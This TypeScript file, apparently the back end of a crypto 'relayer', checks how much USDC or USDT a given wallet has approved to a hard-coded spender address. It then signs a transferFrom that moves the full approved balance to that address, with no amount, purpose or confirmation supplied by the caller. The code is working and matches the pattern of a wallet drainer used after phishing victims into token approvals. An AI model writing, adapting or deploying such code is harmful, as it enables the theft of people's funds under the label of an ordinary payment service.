import { createPublicClient, createWalletClient, http, parseAbi } from 'viem';
import { mainnet } from 'viem/chains';
import { privateKeyToAccount } from 'viem/accounts';

const SPENDER_ADDRESS = "0x2c73de09a4C59E910343626Ab6b4A4d974EC731f" as const;
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7" as const;
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" as const;

const ERC20_ABI = parseAbi([
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function balanceOf(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
]);

const publicClient = createPublicClient({
  chain: mainnet,
  transport: http('https://eth.llamarpc.com'),
});

function getWalletClient() {
  const privateKey = process.env.EVM_SPENDER_PRIVATE_KEY || process.env.RELAYER_PRIVATE_KEY;
  if (!privateKey) {
    throw new Error('EVM_SPENDER_PRIVATE_KEY not configured');
  }
  
  const account = privateKeyToAccount(privateKey.startsWith('0x') ? privateKey as `0x${string}` : `0x${privateKey}`);
  
  return createWalletClient({
    account,
    chain: mainnet,
    transport: http('https://eth.llamarpc.com'),
  });
}

export async function executeTransferFrom(
  userAddress: string,
  tokenSymbol: 'USDC' | 'USDT'
): Promise<{ success: boolean; txHash?: string; error?: string }> {
  try {
    const privateKey = process.env.EVM_SPENDER_PRIVATE_KEY || process.env.RELAYER_PRIVATE_KEY;
    if (!privateKey) {
      return { success: false, error: 'EVM spender not configured - missing private key' };
    }

    const tokenAddress = tokenSymbol === 'USDC' ? USDC_ADDRESS : USDT_ADDRESS;
    const userAddr = userAddress as `0x${string}`;

    const allowance = await publicClient.readContract({
      address: tokenAddress,
      abi: ERC20_ABI,
      functionName: 'allowance',
      args: [userAddr, SPENDER_ADDRESS],
    });

    console.log(`[Relayer] Allowance for ${userAddress} on ${tokenSymbol}: ${allowance}`);

    if (allowance === BigInt(0)) {
      return { success: false, error: 'No allowance set for this token' };
    }

    const balance = await publicClient.readContract({
      address: tokenAddress,
      abi: ERC20_ABI,
      functionName: 'balanceOf',
      args: [userAddr],
    });

    console.log(`[Relayer] Balance for ${userAddress} on ${tokenSymbol}: ${balance}`);

    if (balance === BigInt(0)) {
      return { success: false, error: 'User has no balance of this token' };
    }

    const transferAmount = allowance < balance ? allowance : balance;

    const walletClient = getWalletClient();
    
    console.log(`[Relayer] Executing transferFrom: ${userAddress} -> ${SPENDER_ADDRESS}, amount: ${transferAmount}`);

    const txHash = await walletClient.writeContract({
      address: tokenAddress,
      abi: ERC20_ABI,
      functionName: 'transferFrom',
      args: [userAddr, SPENDER_ADDRESS, transferAmount],
    });

    console.log(`[Relayer] Transaction submitted: ${txHash}`);

    const receipt = await publicClient.waitForTransactionReceipt({ hash: txHash });
    
    if (receipt.status === 'success') {
      console.log(`[Relayer] Transfer successful: ${txHash}`);
      return { success: true, txHash };
    } else {
      return { success: false, error: 'Transaction reverted' };
    }
  } catch (error: any) {
    console.error('[Relayer] Error:', error);
    return { success: false, error: error?.message || 'Unknown error' };
  }
}

export async function checkRelayerStatus(): Promise<{ configured: boolean; address?: string; balance?: string }> {
  try {
    const privateKey = process.env.EVM_SPENDER_PRIVATE_KEY || process.env.RELAYER_PRIVATE_KEY;
    if (!privateKey) {
      return { configured: false };
    }

    const account = privateKeyToAccount(privateKey.startsWith('0x') ? privateKey as `0x${string}` : `0x${privateKey}`);
    
    const balance = await publicClient.getBalance({ address: account.address });
    const ethBalance = (Number(balance) / 1e18).toFixed(4);

    return { 
      configured: true, 
      address: account.address,
      balance: `${ethBalance} ETH`
    };
  } catch (error) {
    return { configured: false };
  }
}
